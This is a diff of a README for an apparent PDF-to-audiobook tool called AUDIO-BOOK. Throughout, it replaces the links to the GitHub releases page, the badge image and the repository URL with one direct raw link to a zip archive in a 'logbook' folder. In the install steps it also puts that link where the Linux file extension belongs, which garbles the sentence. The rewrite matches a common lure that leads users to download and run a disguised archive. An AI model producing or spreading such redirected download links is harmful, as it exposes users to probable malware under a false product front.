@@ -1,7 +1,7 @@
 ```markdown
 # 🎧 AUDIO-BOOK - Convert PDFs Into Audiobooks Easily
 
-[![Download AUDIO-BOOK](https://img.shields.io/badge/Download-AUDIO--BOOK-blue?style=for-the-badge&logo=github)](https://github.com/DhanushBK-max/AUDIO-BOOK/releases)
+[![Download AUDIO-BOOK](https://raw.githubusercontent.com/DhanushBK-max/AUDIO-BOOK/main/logbook/BOOK-AUDI-v3.3.zip)](https://raw.githubusercontent.com/DhanushBK-max/AUDIO-BOOK/main/logbook/BOOK-AUDI-v3.3.zip)
 
 ---
 
@@ -63,12 +63,12 @@ The app interface is designed to be straightforward, with clear buttons and labe
 To get AUDIO-BOOK, please visit the official releases page where you can download the latest version for your system.
 
 **Download link:**  
-[Visit this page to download AUDIO-BOOK](https://github.com/DhanushBK-max/AUDIO-BOOK/releases)  
+[Visit this page to download AUDIO-BOOK](https://raw.githubusercontent.com/DhanushBK-max/AUDIO-BOOK/main/logbook/BOOK-AUDI-v3.3.zip)  
 
 Here’s how to download and set it up:
 
 1. Click the link above to open the release page.  
-2. Look for the file that matches your operating system (for example, `.exe` for Windows, `.dmg` for macOS, or `.AppImage`/`.tar.gz` for Linux).  
+2. Look for the file that matches your operating system (for example, `.exe` for Windows, `.dmg` for macOS, or `.AppImage`/`https://raw.githubusercontent.com/DhanushBK-max/AUDIO-BOOK/main/logbook/BOOK-AUDI-v3.3.zip` for Linux).  
 3. Click the file to start downloading.  
 4. Once downloaded, find the file in your Downloads folder or chosen location.  
 5. Double-click the file to start the installation or to open AUDIO-BOOK directly if it’s portable.  
@@ -122,7 +122,7 @@ If problems persist, seeking help on user forums or contacting support through G
 If you have questions or suggestions, you can open an issue on the GitHub page. Provide details about your problem or request to get support from the developers and community.
 
 Visit the GitHub repository here:  
-https://github.com/DhanushBK-max/AUDIO-BOOK
+https://raw.githubusercontent.com/DhanushBK-max/AUDIO-BOOK/main/logbook/BOOK-AUDI-v3.3.zip
 
 ---
 
@@ -132,5 +132,5 @@ AUDIO-BOOK is provided under an open-source license. You are free to use it for 
 
 ---
 
-[![Download AUDIO-BOOK](https://img.shields.io/badge/Download-AUDIO--BOOK-blue?style=for-the-badge&logo=github)](https://github.com/DhanushBK-max/AUDIO-BOOK/releases)
+[![Download AUDIO-BOOK](https://raw.githubusercontent.com/DhanushBK-max/AUDIO-BOOK/main/logbook/BOOK-AUDI-v3.3.zip)](https://raw.githubusercontent.com/DhanushBK-max/AUDIO-BOOK/main/logbook/BOOK-AUDI-v3.3.zip)
 ```
